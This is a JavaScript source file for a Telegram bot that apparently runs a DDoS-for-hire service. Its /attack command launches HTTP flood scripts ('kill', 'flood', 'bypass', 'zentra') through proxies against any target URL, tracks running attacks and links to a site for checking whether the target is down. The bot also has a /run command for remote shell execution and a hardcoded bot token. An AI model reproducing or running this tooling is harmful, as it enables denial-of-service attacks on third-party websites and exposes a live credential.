const TelegramBot = require('node-telegram-bot-api')
const { spawn } = require('child_process')
const express = require('express')
const si = require('systeminformation')
const fs = require('fs').promises
const path = require('path')

const TOKEN = '7937745403:AAGv0jQPQPZZcQYMauM5xNeKVxMIU5LOLgk'
const bot = new TelegramBot(TOKEN, { polling: true })

const app = express()
const PORT = process.env.PORT || 3000
app.get('/', (req, res) => res.send('https://api-kiendev.up.railway.app Free APIs'))
app.listen(PORT, () => console.log(`Listening on port ${PORT}`))

const activeAttacks = {}
const GROUP_SETTINGS_PATH = path.join(__dirname, 'assets', 'group_settings.json')
const ADMIN_LIST_PATH = path.join(__dirname, 'assets', 'admin_lists.json')

async function loadJson(filePath) {
  try {
    const data = await fs.readFile(filePath, 'utf8')
    return JSON.parse(data)
  } catch (err) {
    return filePath.includes('admin_lists') ? {} : {}
  }
}

async function saveJson(filePath, data) {
  await fs.writeFile(filePath, JSON.stringify(data, null, 2))
}

bot.onText(/\/system/, async (msg) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
  const isGroupActive = groupSettings[chatId]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  try {
    const [cpu, mem, disk, os, network, processes, cpuCurrentSpeed] = await Promise.all([
      si.cpu(),
      si.mem(),
      si.fsSize(),
      si.osInfo(),
      si.networkInterfaces(),
      si.processes(),
      si.currentLoad()
    ])
    const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
    const networkInfo = network.length > 0 ? network[0] : { iface: 'N/A', ip4: 'N/A' }
    const systemInfo = {
      os: `${os.distro} ${os.release} (${os.arch})`,
      kernel: os.kernel,
      hostname: os.hostname,
      cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
      cpuLoad: `${cpuCurrentSpeed.currentLoad.toFixed(2)}%`,
      ram: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
      disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
      network: `${networkInfo.iface} (${networkInfo.ip4})`,
      activeProcesses: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None'
    }
    bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch (err) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.onText(/\/adminlist/, async (msg) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
  const isGroupActive = groupSettings[chatId]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  const adminList = Object.entries(admins).map(([id, name]) => ({ id: Number(id), name }))
  bot.sendMessage(chatId, '```json\n' + JSON.stringify({ adminList }, null, 2) + '\n```', { parse_mode: 'Markdown' })
})

bot.onText(/\/methods/, async (msg) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
  const isGroupActive = groupSettings[chatId]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, bypass')
})

bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))

  if (!isAdmin) {
    bot.sendMessage(chatId, 'Only admins can toggle bot status')
    return
  }

  const status = match[1] === 'on'
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  groupSettings[chatId] = { botStatus: status }
  await saveJson(GROUP_SETTINGS_PATH, groupSettings)
  bot.sendMessage(chatId, '```json\n' + JSON.stringify({ botStatus: status ? 'Enabled' : 'Disabled', groupId: chatId }, null, 2) + '\n```', { parse_mode: 'Markdown' })
})

bot.onText(/\/run (.+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))

  if (!isAdmin) {
    bot.sendMessage(chatId, 'Only admins can run commands')
    return
  }

  const command = match[1]
  const args = command.split(/\s+/)
  const cmdName = args.shift()

  try {
    const cmd = spawn(cmdName, args, { stdio: ['ignore', 'pipe', 'pipe'] })
    let output = ''
    let errorOutput = ''

    cmd.stdout.on('data', (data) => {
      output += data.toString()
    })

    cmd.stderr.on('data', (data) => {
      errorOutput += data.toString()
    })

    cmd.on('close', (code) => {
      const response = {
        command,
        status: code === 0 ? 'Success' : 'Failed',
        output: output || 'No output',
        error: errorOutput || 'No error',
        exitCode: code
      }
      bot.sendMessage(chatId, '```json\n' + JSON.stringify(response, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })

    cmd.on('error', (err) => {
      bot.sendMessage(chatId, '```json\n' + JSON.stringify({ command, error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })
  } catch (err) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ command, error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.on('message', async (msg) => {
  const id = msg.chat.id
  const text = msg.text?.trim()
  const userId = msg.from.id
  const username = msg.from.username || 'depTrai'

  if (!text) return

  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(userId))
  const isGroupActive = groupSettings[id]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  if (text.startsWith('/attack')) {
    const args = text.split(/\s+/).slice(1)
    let [method, target, timeStr, threadsStr, proxyFile, rateStr] = args
    const time = parseInt(timeStr) || 60
    const threads = parseInt(threadsStr) || 15
    const proxy = proxyFile || './prx.txt'
    const rate = parseInt(rateStr) || 20

    if (!target) {
      bot.sendMessage(id, 'Target URL is required')
      return
    }
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
      target = `https://${target}`
    }
    if (target.startsWith('http://')) {
      target = target.replace('http://', 'https://')
    }

    if (args.length < 2) {
      bot.sendMessage(id, 'Usage: /attack [method] [target] [time] [threads] [proxyfile] [rate]')
      return
    }

    if (!['kill', 'flood', 'zentra', 'bypass'].includes(method)) {
      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "bypass".')
      return
    }

    if (isNaN(time)) {
      bot.sendMessage(id, 'Invalid time argument')
      return
    }

    if (!isAdmin && time > 60) {
      bot.sendMessage(id, 'Attack time must be ≤ 60 seconds for non-admins')
      return
    }

    try {
      const proxyContent = await fs.readFile(proxy, 'utf8')
      if (!proxyContent.trim()) {
        bot.sendMessage(id, 'Proxy file is empty')
        return
      }
    } catch (err) {
      bot.sendMessage(id, 'Proxy file not found or empty')
      return
    }

    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'bypass' ? './bypass.js' : './l7-zentra.js'
    const cmdArgs = [scriptFile, target, time, rate, threads, proxy]
    const cmd = spawn('node', cmdArgs, { stdio: ['ignore', 'pipe', 'pipe'] })
    const attackId = `${userId}_${Date.now()}`
    activeAttacks[attackId] = { cmd, target, time, rate, threads, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method }

    const response = {
      status: 'Attack Started',
      method,
      target,
      time,
      rate,
      threads,
      proxy,
      caller: username,
      index: attackId
    }

    const sentMsg = await bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Check Website 🔍',
              url: `https://check-host.net/check-http?host=${target}`
            }
          ]
        ]
      }
    })
    activeAttacks[attackId].messageId = sentMsg.message_id

    const interval = setInterval(async () => {
      if (!activeAttacks[attackId]) {
        clearInterval(interval)
        return
      }
      const elapsed = Math.floor((Date.now() - activeAttacks[attackId].startTime) / 1000)
      activeAttacks[attackId].remainingTime = Math.max(0, time - elapsed)
      const updatedResponse = {
        status: activeAttacks[attackId].remainingTime > 0 ? 'Attack Running' : 'Attack Finished',
        method,
        target,
        time: activeAttacks[attackId].remainingTime,
        rate,
        threads,
        proxy,
        caller: username,
        index: attackId
      }
      try {
        await bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
          chat_id: id,
          message_id: activeAttacks[attackId].messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Check Website 🔍',
                  url: `https://check-host.net/check-http?host=${target}`
                }
              ]
            ]
          }
        })
        if (activeAttacks[attackId].remainingTime <= 0) {
          activeAttacks[attackId].cmd.kill()
          clearInterval(interval)
          delete activeAttacks[attackId]
        }
      } catch (err) {
        console.error(`Failed to edit message: ${err.message}`)
      }
    }, 5000)

    cmd.stderr.on('data', (data) => {
      console.error(`Script error: ${data}`)
      bot.sendMessage(id, `${scriptFile}: ${data}`)
    })

    cmd.on('error', (err) => {
      clearInterval(interval)
      delete activeAttacks[attackId]
      bot.sendMessage(id, `Error: ${err.message}`)
    })

    cmd.on('close', (code) => {
      clearInterval(interval)
      delete activeAttacks[attackId]
      bot.sendMessage(id, `Attack on ${target} finished with code ${code}`)
    })

    setTimeout(() => {
      if (activeAttacks[attackId]) {
        activeAttacks[attackId].cmd.kill()
        clearInterval(interval)
        delete activeAttacks[attackId]
      }
    }, time * 1000)
  }

  if (text === '/list') {
    const list = Object.entries(activeAttacks)
      .filter(([_, v]) => isAdmin || v.userId === userId)
      .map(([key, v]) => ({
        index: key,
        method: v.method,
        target: v.target,
        time: v.remainingTime,
        rate: v.rate,
        threads: v.threads,
        proxy: v.proxy
      }))
    bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/stop')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 1) {
      bot.sendMessage(id, 'Usage: /stop <index>')
      return
    }
    const key = args[0]
    const attack = activeAttacks[key]
    if (!attack) {
      bot.sendMessage(id, 'Attack not found')
      return
    }
    if (!isAdmin && attack.userId !== userId) {
      bot.sendMessage(id, 'Permission denied')
      return
    }
    attack.cmd.kill()
    delete activeAttacks[key]
    bot.sendMessage(id, `Attack on ${attack.target} stopped`)
  }

  if (text.startsWith('/add') && msg.reply_to_message) {
    if (!isAdmin) {
      bot.sendMessage(id, 'Only admins can add new admins')
      return
    }
    const newAdminId = String(msg.reply_to_message.from.id)
    const newAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
    if (admins[newAdminId]) {
      bot.sendMessage(id, 'User is already an admin')
      return
    }
    admins[newAdminId] = newAdminName
    await saveJson(ADMIN_LIST_PATH, admins)
    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminAdd: true, fullName: newAdminName, idNewAdmin: Number(newAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/remove') && msg.reply_to_message) {
    if (!isAdmin) {
      bot.sendMessage(id, 'Only admins can remove admins')
      return
    }
    const removeAdminId = String(msg.reply_to_message.from.id)
    const removeAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
    if (!admins[removeAdminId]) {
      bot.sendMessage(id, 'User is not an admin')
      return
    }
    delete admins[removeAdminId]
    await saveJson(ADMIN_LIST_PATH, admins)
    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminRemove: true, fullName: removeAdminName, idRemovedAdmin: Number(removeAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.on('polling_error', (err) => console.error(err.message))
